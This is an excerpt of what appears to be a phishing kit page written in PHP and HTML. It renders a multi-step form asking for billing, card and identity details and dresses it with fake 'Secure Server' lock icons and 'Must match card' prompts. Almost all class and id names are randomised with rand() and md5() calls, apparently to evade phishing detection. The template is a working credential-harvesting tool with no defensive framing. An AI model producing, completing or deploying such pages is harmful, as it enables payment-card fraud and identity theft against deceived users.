...
<head>
	...
	<script src="../../../RGN/lib/js/jquery.1.11.1.min.js?<?php echo rand(); ?>"></script> 
    <script src="../../../RGN/lib/js/rougani.js?<?php echo rand(); ?>"></script>
</head>
<body id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
    <div  for="<? echo"".md5(gmdate('r'))."" ?>"  class="RR-OO-UU-GG-AA-NN-II"> 
        <div class="POP-RGN-2"> 
            <div  for=" <? echo"".md5(gmdate('r')).""?>"  class="POP-RGN-1"> 
                <div  for=" <? echo"".md5(gmdate('r')).""?>"  class="POP-RGN-3" style="padding-left: 94%;padding-top: 5px;"><a href="javascript:closeVentana();"><img src="../../../RGN/lib/img/Danger-16.png?<?php echo rand(); ?>"></a></div> 
                <a   id="<? echo"". rand(231574985612, 231325646879656321231254).""?>"   href="javascript:closeVentana();" class="POP-RGN-4" id="ftahcont-jdid"><?=$msj_dyal_zeb2;?></a> 
                <center><a href="javascript:closeVentana();"><img class="IMG-POP-RGN-1" src="../../../RGN/lib/img/inter.png?<?php echo rand(); ?>"></a></center> 
                <br> 
                <br> 
                <ul> 
                    <li style="list-style-type: none;"><a style="text-decoration:none;" href="javascript:closeVentana();"><font size="1" color="#6D6D6E">Copyright © 1999 - <? echo"". date("Y").""?> </font></a></li> 
                </ul> 
            </div> 
        </div> 
    </div>
            ...
            <section id="xx_GOxGO" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                <div id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xGhostxRider_JC <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_V654DF654THEBEASTXX" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                        <form id="msform" action="" method="post" name="GOxGOxPOWERxRANGERS" class="GOxGOxPOWERxRANGERS" no<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                <ul id="progressbar">
									<li class="active" style="width: 25%;">Billing Info</li>
									<li style="width: 25%;">Card Info</li>
									<li style="width: 25%;">Identity Info</li>
                            ...
                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_Gh0ST789 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">	
									    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" style="text-align: left;">
									        <p style="margin-bottom: 8px;font-size: larger;"><?=$Z118_update_bill;?><span class="input-caption" data-reactid="37" style="font-size: 11px;font-style: normal;color: #9a9a9a;padding-left: 16px;">Must match card</span><span class="icon-lock" data-reactid="123" style="color: #ffa00a;margin-left: 5px;"></span></p>                                       
                                            <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_Gh0ST789 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                ...
                                <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> 0Dats_Good0 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>"style="margin-top: 5em;"><p style="margin-bottom: 8px;text-align: left;font-size: larger;"><?=$Z118_update_card;?><span class="input-caption" data-reactid="37" style="font-size: 11px;font-style: normal;color: #9a9a9a;padding-left: 16px;">Must match card</span><span class="icon-lock" data-reactid="123" style="color: #ffa00a;margin-left: 5px;"></span></p>
                                    <div class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_Gh0ST789 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
									...
									<div class="secure" data-reactid="121" style="/*! position: relative; */top: 6px;float: left;margin: 10px 0px;"><span class="secure-text" data-reactid="122" style="font-size: 12px;color: #666;">Secure Server</span><span class="icon-lock" data-reactid="123" style="color: #ffa00a;margin-left: 5px;"></span></div><br>
                                </div>
                            </div>
                        </form>
                    </div>
...
<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script src="../../../RGN/lib/js/jquery.js"></script>
    <script src="../../../RGN/lib/js/jquery.validate.js"></script>
	<script src="../../../RGN/lib/js/jquery.additional-methods.js"></script>
	<script src="../../../RGN/lib/js/jquery.v-form.js"></script>
	<script src="../../../RGN/lib/js/jquery.CardValidator.js"></script>
	<script src="../../../RGN/lib/js/jquery.mask.js"></script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
